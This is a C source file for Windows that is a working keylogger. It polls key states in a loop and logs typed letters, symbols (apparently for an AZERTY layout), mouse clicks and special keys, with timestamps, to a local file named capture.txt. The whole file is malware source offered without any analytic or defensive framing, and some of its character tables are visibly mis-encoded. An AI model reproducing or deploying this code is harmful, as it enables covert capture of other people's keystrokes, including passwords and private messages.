#include <stdio.h>
#include <conio.h>
#include <ctype.h>
#include <time.h>
#include <windows.h>

#define OUTPUT_FILE "capture.txt"

enum {
    second,
    minute,
    hour,
    day,
    weekDay,
    yearDay,
    month,
    year
};

int get_localTime(int type) {
    int ret=0;
	time_t timer;
	struct tm *structtimer=NULL;
	time(&timer);
	structtimer=localtime(&timer);
	switch(type) {
    case second:
        ret=structtimer->tm_sec;
        break;
    case minute:
        ret=structtimer->tm_min;
        break;
    case hour:
        ret=structtimer->tm_hour;
        break;
    case day:
        ret=structtimer->tm_mday;
        break;
    case weekDay:
        ret=(structtimer->tm_wday-1);
        if(ret<0) ret=6;
        break;
    case yearDay:
        ret=structtimer->tm_yday;
        break;
    case month:
        ret=(structtimer->tm_mon+1);
        break;
    case year:
        ret=(structtimer->tm_year+1900);
        break;
    default:
        break;
	}
	return ret;
}

int _strlen(char *str) {
	int len=0;
	while(str[len]!='\0') len++;
	return len;
}

int is_pressed(int value) {
    int result=GetKeyState(value);
    if(result==-127 || result==-128)
        return 1;
    else
        return 0;
}

int check_alt(void) {
    int alt=0;
    if(is_pressed(VK_MENU))
        alt=1;
    return alt;
}

int check_maj(void) {
    int maj=0;
    if(GetKeyState(VK_CAPITAL)==0)
        maj=0;
    else if(GetKeyState(VK_CAPITAL)==1)
        maj=1;
    if(is_pressed(VK_SHIFT))
        maj=(maj==0)?1:0;
    return maj;
}

int print_letter(char value) {
    int ret=0;
    FILE *f=NULL;
    f=fopen(OUTPUT_FILE, "a");
    if(f!=NULL) {
        fseek(f, 0, SEEK_END);
        if(fputc(value, f))
            ret=1;
        fclose(f);
    }
    return ret;
}

int print_state(char *value) {
    int ret=0;
    FILE *f=NULL;
    f=fopen(OUTPUT_FILE, "a");
    if(f!=NULL)
    {
        fseek(f, 0, SEEK_END);
        fputs(value, f);
            ret=1;
        fclose(f);
    }
    return ret;
}

int file_exists(char *path) {
	FILE *f=NULL;
	f=fopen(path, "r");
	if(f==NULL) return 0;
	else
	{
		fclose(f);
		return 1;
	}
}

char init() {
    char ret=0;
    char session_text[256]={0};
    FILE *f=NULL;
    f=fopen(OUTPUT_FILE, "a");
    if(f!=NULL) {
        sprintf(session_text, "\n----------------Session on %d/%d/%d at %d:%d:%d----------------\n", get_localTime(day), get_localTime(month), get_localTime(year), get_localTime(hour), get_localTime(minute), get_localTime(second));
        fputs(session_text, f);
        fclose(f);
        ret=1;
    }
    return ret;
}

int test_signs(int maj, int alt, int *last_letter, int *c) {
    int error=0, i, sign[]={188, 190, 191, 223, 192, 220, 186, 221, 226, 187, 219, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 32, VK_RETURN};
    char low[]=",;:!∙*$^<=)р&щ\"'(-ш_ч \n";
    char big[]="?./з%╡ги>+░0123456789 \n";
    char alT[]="      д  }]@~#{[|`\\^ \n";
    for(i=0; i<_strlen(low) && !error; i++) {
        if(is_pressed(sign[i]) && *c==0) {
            if(!print_letter((alt==1 && alT[i]!=' ')?alT[i]:((maj==0)?low[i]:big[i])))
                error=1;
            *last_letter=sign[i];
            if(*last_letter==sign[i])
                *c=1;
        }
    }
    if(is_pressed(1) && *c==0) {
        if(!print_state(" [LCLIC] "))
            error=1;
        *last_letter=1;
        if(*last_letter==1)
            *c=1;
    }
    else if(is_pressed(2) && *c==0) {
        if(!print_state(" [RCLIC] "))
            error=1;
        *last_letter=2;
        if(*last_letter==2)
            *c=1;
    }
    else if(is_pressed(4) && *c==0) {
        if(!print_state(" [MCLIC] "))
            error=1;
        *last_letter=4;
        if(*last_letter==4)
            *c=1;
    }
    else if(is_pressed(8) && *c==0) {
        if(!print_state(" [BKSPACE] "))
            error=1;
        *last_letter=8;
        if(*last_letter==8)
            *c=1;
    }
    else if(is_pressed(46) && *c==0) {
        if(!print_state(" [DEL] "))
            error=1;
        *last_letter=46;
        if(*last_letter==46)
            *c=1;
    }
    else if(is_pressed(9) && *c==0) {
        if(!print_state(" [TAB] "))
            error=1;
        *last_letter=9;
        if(*last_letter==9)
            *c=1;
    }
    return error;
}

int main(int argc, char **argv) {
    int i, last_letter=0, maj=0, alt=0, c=0, error=0, x=argc;
    x++;
    if(init()) {
        while(!error) {
            maj=check_maj();
            alt=check_alt();
            for(i='A'; i<='Z' && !error; i++) {
                if(is_pressed(i) && c==0) {
                    if(!print_letter((maj==1)?toupper(i):tolower(i)))
                        error=1;
                    last_letter=i;
                    if(last_letter==i)
                        c=1;
                }
            }
            if(test_signs(maj, alt, &last_letter, &c)==1)
                error=1;
            if(!is_pressed(last_letter))
                c=0;
        }
    }
    getchar();
    getchar();
    return 0;
}



